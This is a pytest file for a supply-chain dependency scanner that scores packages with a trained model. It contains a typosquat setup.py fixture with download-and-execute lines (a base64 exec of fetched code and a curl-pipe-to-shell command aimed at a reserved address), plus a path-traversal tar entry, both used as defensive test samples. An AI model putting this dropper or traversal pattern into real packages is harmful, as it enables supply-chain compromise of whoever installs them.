"""tests for the supplyx dependency gate."""
import io
import os
import sys
import tarfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest
import xgboost as xgb

from supplyx import scan
from supplyx.archive import UnsafeArchiveError, safe_unpack

# inert: scanned as text only, never executed (198.51.100.0/24 is a reserved range)
DROPPER_SETUP = """
import base64
import subprocess
import urllib.request
from setuptools import setup
if False:
    exec(base64.b64decode(urllib.request.urlopen("http://198.51.100.7/s").read()))
    subprocess.run("curl -s http://198.51.100.7/x.sh | sh", shell=True)
setup(name="reqeusts", version="9.9.9")
"""

BENIGN_SETUP = """
from setuptools import setup
setup(name="nicepkg", version="1.0.0", url="https://github.com/example/nicepkg")
"""


def _sdist(name: str, setup_src: str) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        data = setup_src.encode()
        info = tarfile.TarInfo(f"{name}/setup.py")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


@pytest.fixture(scope="module")
def model():
    booster = xgb.Booster()
    booster.load_model(str(scan.MODEL_FILE))
    return booster


def test_dropper_typosquat_is_blocked(model):
    meta = {"name": "reqeusts", "version": "9.9.9", "registry": "pypi", "version_count": 1}
    feats = scan.extract_features(_sdist("reqeusts-9.9.9", DROPPER_SETUP), meta)
    prob, reasons = scan.score(model, feats)
    assert feats["typosquat_target"] == "requests"
    assert prob >= 0.8
    assert reasons


def test_benign_package_passes(model):
    meta = {"name": "nicepkg", "version": "1.0.0", "registry": "pypi", "version_count": 12}
    prob, _ = scan.score(model, scan.extract_features(_sdist("nicepkg-1.0.0", BENIGN_SETUP), meta))
    assert prob < 0.6


def test_requirements_parsing_follows_includes_and_local_archives(tmp_path):
    (tmp_path / "base.txt").write_text("flask==3.1.3  # web\n./vendor/thing-1.0.tar.gz\n")
    (tmp_path / "dev.txt").write_text("-r base.txt\npytest\n")
    deps = scan.parse_requirements(tmp_path / "dev.txt")
    assert [(d["kind"], d.get("name"), d.get("version")) for d in deps] == [
        ("pypi", "flask", "3.1.3"),
        ("local", None, None),
        ("pypi", "pytest", None),
    ]


def test_path_traversal_archive_is_rejected(tmp_path):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        info = tarfile.TarInfo("../evil.py")
        info.size = 5
        tf.addfile(info, io.BytesIO(b"pwned"))
    with pytest.raises(UnsafeArchiveError):
        safe_unpack(buf.getvalue(), str(tmp_path / "dest"))
    assert not (tmp_path / "evil.py").exists()


@pytest.mark.parametrize("score,level", [(0.05, "low"), (0.3, "medium"), (0.6, "high"), (0.8, "critical")])
def test_risk_levels(score, level):
    assert scan.risk_level(score) == level
